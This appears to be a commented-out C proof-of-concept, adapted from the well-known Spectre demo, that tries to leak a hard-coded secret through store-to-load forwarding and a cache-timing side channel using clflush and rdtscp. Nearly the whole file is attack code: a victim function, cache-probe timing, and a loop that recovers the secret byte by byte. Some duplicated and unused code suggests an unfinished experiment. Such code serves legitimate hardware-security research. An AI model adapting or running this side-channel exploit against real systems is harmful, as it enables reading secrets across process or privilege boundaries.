///* Compile with "gcc -O0 -std=gnu99" */
//
//#include <stdio.h>
//#include <stdlib.h>
//#include <stdint.h>
//#include <string.h>
//#ifdef _MSC_VER
//#include <intrin.h> /* for rdtscp and clflush */
//#pragma optimize("gt",on)
//#else
//#include <x86intrin.h> /* for rdtscp and clflush */
//#endif
//
//#define PAGE_SIZE 4096
//#define ALIGN_UP(x, alignment) (((x+(alignment-1))/alignment)*alignment)
//
///********************************************************************
//Victim code.
//********************************************************************/
//unsigned int array1_size = 16;
//uint8_t unused1[64];
//uint8_t array1[160] = {
//  1,
//  2,
//  3,
//  4,
//  5,
//  6,
//  7,
//  8,
//  9,
//  10,
//  11,
//  12,
//  13,
//  14,
//  15,
//  16
//};
//uint8_t unused2[64];
//uint8_t array2[256 * 512];
//
//char* secret = "The password is rootkea";
//char g_secret[4096 * 2] = { 0 };
//
//uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
//
//void victim_function(size_t x) {
//    if (x < array1_size) {
//        temp &= array2[array1[x] * 512];
//    }
//}
//
//void store_load_forwarding_victim(int8_t* address) {
//    // need to do a load from address X and then a store to address Y
//    // such that X = Y (mod 4096)
//
//    uint64_t offset = ((uint64_t)address) % 4096;
//
//    char* aligned_out_addr = (char*)(ALIGN_UP((uint64_t)g_secret, PAGE_SIZE) + offset);
//
//    // write secret into some address unknown to the attacker
//    *aligned_out_addr = secret[offset];
//
//    // load data from the attacker's address, which has the same offset
//    // in the page as our secret, due to store/load forwarding the
//    // processor is expected to try and execute this instruction
//    // with the secret value
//    temp &= array2[*address * 512];
//}
//
///********************************************************************
//Analysis code
//********************************************************************/
//#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
//
///* Report best guess in value[0] and runner-up in value[1] */
//void readSecret(size_t offset_in_secret, uint8_t value[2], int score[2]) {
//    static int results[256];
//    int tries, i, j, k, mix_i, junk = 0;
//    size_t training_x, x;
//    register uint64_t time1, time2;
//    volatile uint8_t* addr;
//    char local_buffer[4096 * sizeof(uint64_t)] = { 0 };
//    // set the buffer to non-ascii values so that we won't get confused by it
//    memset(local_buffer, 200, 4096 * sizeof(uint64_t));
//    char* address = (char*)local_buffer;
//    
//    // align up
//    address = (char*)(((uint64_t)(address + 4095) / 4096) * 4096);
//
//    for (i = 0; i < 256; i++)
//        results[i] = 0;
//    for (tries = 999; tries > 0; tries--) {
//
//        /* Flush array2[256*(0..255)] from cache */
//        for (i = 0; i < 256; i++)
//            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
//
//          /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
//        training_x = tries % array1_size;
//
//        for (size_t j = 0; j < 100; j++)
//        {
//            store_load_forwarding_victim(address + offset_in_secret);
//        }
//
//        uint64_t times[256];
//
//        /* Time reads. Order is lightly mixed up to prevent stride prediction */
//        for (i = 0; i < 256; i++) {
//            mix_i = ((i * 167) + 13) & 255;
//            addr = &array2[mix_i * 512];
//            time1 = __rdtscp(&junk); /* READ TIMER */
//            junk = *addr; /* MEMORY ACCESS TO TIME */
//            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
//            times[mix_i] = time2;
//            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
//                results[mix_i]++; /* cache hit - add +1 to score for this value */
//        }
//
//        /* Locate highest & second-highest results results tallies in j/k */
//        j = k = -1;
//        for (i = 0; i < 256; i++) {
//            if (j < 0 || results[i] >= results[j]) {
//                k = j;
//                j = i;
//            }
//            else if (k < 0 || results[i] >= results[k]) {
//                k = i;
//            }
//        }
//        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
//            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
//    }
//    results[0] ^= junk; /* use junk so code above won't get optimized out */
//    value[0] = (uint8_t)j;
//    score[0] = results[j];
//    value[1] = (uint8_t)k;
//    score[1] = results[k];
//}
//
//void guess_secret()
//{
//    size_t malicious_x = (size_t)(secret - (char*)array1); /* default for malicious_x */
//    int i, score[2], len = 23;
//    uint8_t value[2];
//
//    for (i = 0; i < sizeof(array2); i++)
//        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
//
//    printf("Reading %d bytes:\n", len);
//    while (--len >= 0) {
//        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
//        readSecret(23 - len, value, score);
//        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
//        printf("0x%02X=%c score=%d ", value[0],
//            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
//        if (score[1] > 0)
//            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
//        printf("\n");
//    }
//}
//
//int main2(int argc,
//    const char** argv) {
//    guess_secret();
//    size_t malicious_x = (size_t)(secret - (char*)array1); /* default for malicious_x */
//    int i, score[2], len = 23;
//    uint8_t value[2];
//
//    for (i = 0; i < sizeof(array2); i++)
//        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
//
//    printf("Reading %d bytes:\n", len);
//    while (--len >= 0) {
//        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
//        readSecret(malicious_x++, value, score);
//        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
//        printf("0x%02X=%c score=%d ", value[0],
//            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
//        if (score[1] > 0)
//            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
//        printf("\n");
//    }
//    return (0);
//}
